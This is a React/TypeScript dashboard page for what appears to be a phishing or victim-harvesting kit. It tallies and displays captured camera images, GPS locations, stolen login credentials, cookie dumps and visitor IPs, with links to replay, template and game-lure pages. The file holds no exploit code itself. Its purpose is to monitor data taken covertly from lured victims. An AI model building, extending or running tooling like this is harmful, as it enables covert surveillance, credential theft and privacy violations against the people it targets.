import { useEffect, useState, useCallback } from 'react'
import { api, Stats, PaginatedCaptures } from '../api/client'

function MetricCard({ label, value, sub, icon }: { label: string; value: string | number; sub?: string; icon: string }) {
  return (
    <div className="metric-card">
      <div className="label">{icon} {label}</div>
      <div className="value">{value}</div>
      {sub && <div className="sub">{sub}</div>}
    </div>
  )
}

export default function Dashboard() {
  const [stats, setStats] = useState<Stats | null>(null)
  const [loading, setLoading] = useState(true)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [lastUpdate, setLastUpdate] = useState('')
  const [error, setError] = useState<string | null>(null)
  const [recentCaptures, setRecentCaptures] = useState<PaginatedCaptures | null>(null)

  const refresh = useCallback(async () => {
    try {
      setStats(await api.stats())
    } catch (e) { setError(e instanceof Error ? e.message : 'Failed to load stats') }
    try {
      setRecentCaptures(await api.captures(1, 6))
    } catch { /* non-critical */ }
    setLastUpdate(new Date().toLocaleTimeString())
    setLoading(false)
  }, [])

  useEffect(() => {
    refresh()
    if (autoRefresh) {
      const timer = setInterval(refresh, 10000)
      return () => clearInterval(timer)
    }
  }, [refresh, autoRefresh])

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="spinner"></div>
      </div>
    )
  }

  if (error && !stats) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-center space-y-3">
          <p className="text-sm text-tertiary">{error}</p>
          <button onClick={refresh} className="px-4 py-1.5 text-xs accent-bg accent radius-sm">Retry</button>
        </div>
      </div>
    )
  }

  const captureRate = stats && stats.total_captures > 0 && stats.first_capture
    ? (stats.total_captures / ((Date.now() / 1000 - stats.first_capture) / 3600)).toFixed(1)
    : '—'

  return (
    <div className="space-y-5">
      <div className="flex items-center justify-between flex-wrap gap-2">
        <div>
          <h1 className="text-lg font-semibold text-primary">Overview</h1>
          {lastUpdate && <p className="text-xs text-tertiary mt-0.5">Updated {lastUpdate}</p>}
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={() => setAutoRefresh(!autoRefresh)}
            className={`flex items-center gap-1.5 px-2.5 py-1.5 text-xs font-medium radius-sm transition-all ${
              autoRefresh ? 'accent-bg accent' : 'text-tertiary'
            }`}
          >
            <span className={`w-1.5 h-1.5 rounded-full ${autoRefresh ? 'animate-pulse-dot' : ''}`}
              style={{ background: autoRefresh ? 'var(--color-accent)' : 'var(--color-muted)' }}></span>
            {autoRefresh ? 'Live' : 'Paused'}
          </button>
          <button onClick={refresh} className="px-2.5 py-1.5 text-xs text-tertiary hover:text-secondary radius-sm transition-colors">⟳</button>
        </div>
      </div>

      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <MetricCard label="Captures" value={stats?.total_captures ?? 0}
          sub={`${(stats?.total_size_mb ?? 0).toFixed(2)} MB`} icon="📷" />
        <MetricCard label="Locations" value={stats?.total_locations ?? 0} sub="GPS" icon="📍" />
        <MetricCard label="Credentials" value={stats?.total_credentials ?? 0} sub="logins" icon="🔑" />
        <MetricCard label="Storage" value={stats?.total_storage_dumps ?? 0} sub="cookies" icon="🍪" />
      </div>

      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <MetricCard label="IPs" value={stats?.unique_ips ?? 0}
          sub={`${stats?.total_ips ?? 0} visits`} icon="🌐" />
        <MetricCard label="Data" value={`${(stats?.total_size_mb ?? 0).toFixed(1)}`} sub="MB" icon="💾" />
        <MetricCard label="Capture rate" value={captureRate} sub="per hour" icon="⚡" />
        <MetricCard label="Session age" value={stats?.first_capture
          ? `${Math.floor((Date.now() / 1000 - stats.first_capture) / 3600)}h`
          : '—'} sub={stats?.last_capture
            ? `${Math.floor((Date.now() / 1000 - stats.last_capture) / 60)}m ago`
            : 'waiting'} icon="⏱" />
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <div className="content-card">
          <h3 className="section-head">Quick actions</h3>
          <div className="grid grid-cols-2 gap-1.5">
            <a href="/captures" className="nav-link active justify-center text-center">📷 Captures</a>
            <a href="/locations" className="nav-link active justify-center text-center">📍 Locations</a>
            <a href="/ips" className="nav-link active justify-center text-center">🌐 IPs</a>
            <a href="/credentials" className="nav-link active justify-center text-center">🔑 Credentials</a>
            <a href="/storage" className="nav-link active justify-center text-center">🍪 Storage</a>
            <a href="/replay" className="nav-link active justify-center text-center">⚡ Replay</a>
            <a href="/templates" className="nav-link active justify-center text-center">🎭 Templates</a>
            <a href="/t/face-runner" target="_blank" rel="noreferrer" className="nav-link active justify-center text-center">🎮 Game</a>
          </div>
        </div>

        <div className="content-card">
          <h3 className="section-head">System</h3>
          <div className="space-y-2.5">
            <div className="flex items-center justify-between py-1">
              <span className="text-sm text-tertiary">App</span>
              <span className="flex items-center gap-1.5 text-xs" style={{ color: '#34c759' }}>
                <span className="w-1.5 h-1.5 rounded-full" style={{ background: '#34c759' }}></span>
                Online
              </span>
            </div>
            <div className="flex items-center justify-between py-1">
              <span className="text-sm text-tertiary">Database</span>
              <span className="flex items-center gap-1.5 text-xs" style={{ color: '#34c759' }}>
                <span className="w-1.5 h-1.5 rounded-full" style={{ background: '#34c759' }}></span>
                Connected
              </span>
            </div>
            <div className="flex items-center justify-between py-1">
              <span className="text-sm text-tertiary">TrailBase</span>
              <a href={(import.meta.env.VITE_TRAILBASE_URL || '').replace(/\/+$/, '') + '/_/admin/'} target="_blank" rel="noreferrer" className="flex items-center gap-1.5 text-xs accent hover:underline">
                <span className="w-1.5 h-1.5 rounded-full" style={{ background: 'var(--color-accent)' }}></span>
                Admin
              </a>
            </div>
          </div>
        </div>
      </div>

      {recentCaptures && recentCaptures.captures.length > 0 && (
        <div className="content-card">
          <h3 className="section-head">Recent captures</h3>
          <div className="grid grid-cols-3 md:grid-cols-6 gap-2">
            {recentCaptures.captures.map((c, i) => (
              <a key={c.id} href={c.url} target="_blank" rel="noreferrer"
                 className="block aspect-video bg-tertiary radius-sm overflow-hidden hover:ring-1 ring-accent transition-all animate-fade-up"
                 style={{ animationDelay: `${i * 0.04}s` }}>
                <img src={c.url} alt="" className="w-full h-full object-cover" />
              </a>
            ))}
          </div>
        </div>
      )}
    </div>
  )
}
